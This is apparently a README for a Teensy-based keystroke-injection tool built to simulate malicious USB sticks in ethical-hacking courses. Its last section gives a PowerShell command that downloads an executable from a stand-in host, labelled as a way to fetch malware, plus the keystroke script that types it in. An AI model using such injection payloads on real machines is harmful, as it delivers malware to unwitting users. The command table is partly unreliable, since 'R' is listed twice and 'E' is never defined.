# teensy
Tools and projects all around the Teensy USB Development Board

## teensy_keyboard

Based on the Keyboard-Library and example from the Teensy Homepage:
https://www.pjrc.com/teensy/index.html

This program allows you to define a very simple string which is parsed and
sent as Keystrokes to the Computer after the Teensy gets pluged in.

I created this to simulate Malicious USB-Sticks in Ethical-Hackin courses
and presentations withing [ThinkArena](http://www.denkarena.ch/)

### Commands and Format

The String can be of Keystrokes, Strings, Pause, Return and others:
* The `K:` is used to simulate a KeyStroke with a modifier key
** Modifiers are A(al), C(trl), W(in), S(hift), N(one)
** Additional Modifiers can written separated with a space:
*** Use at least two characters like: AL(t), CT(rl), SH(ift), WI(n)
*** In normal mode all keys are send together
*** Special keys: CT(rl), AL(t), WI(n), SH(ift), DE(el), HO(me), IN(sert), EN(d), ES(cape), SY(srq), EN(ter), TA(b)
** Examples:
*** to send a single space, use the `SP` with the `N` modifier: `K: N SP`
*** to send `ctrl+alt+del` use something like this: `K: CTRL ALT DEL` (or in short `K C AL DE`)
* The `S:` is used to write a string
* The `W:` is used to wait the given amount of milliseconds before the next line is processed
* The `X` is used to send a ESC Keystroke
* The `R` is used to send the RETURN/ENTER key
* The `T` is used to send the TABULATOR key
* The `U` is used to send the ARROW-UP key
* The `D` is used to send the ARROW-DOWN key
* The `L` is used to send the ARROW-LEFT key
* The `R` is used to send the ARROW-RIGHT key

For better readability you can use a doublepoint to sepaarte the command character from the following string.

**Example**

Open Notepad and write something:
```
K WIN R
W 50
S notepad
W 200
S You've just inserted a malicious USB-Stick.
E
S Always take care about what you're connection
E
S Cheers...
E
```

### Downlaod in Windows

Under Windows you can use something like this on Windows to download Maleware in a Powershell:

```Batchfile
$client = New-Object System.Net.WebClient
$client.DownloadFile("http://www.example.com/file.exe", "C:\")
```

This would result in a String like this:
```
K: WIN R
W: 50
S: powershell
E:
S: $client = New-Object System.Net.WebClient
E:
S: $client.DownloadFile("http://www.example.com/file.exe", "C:\")
E:
```

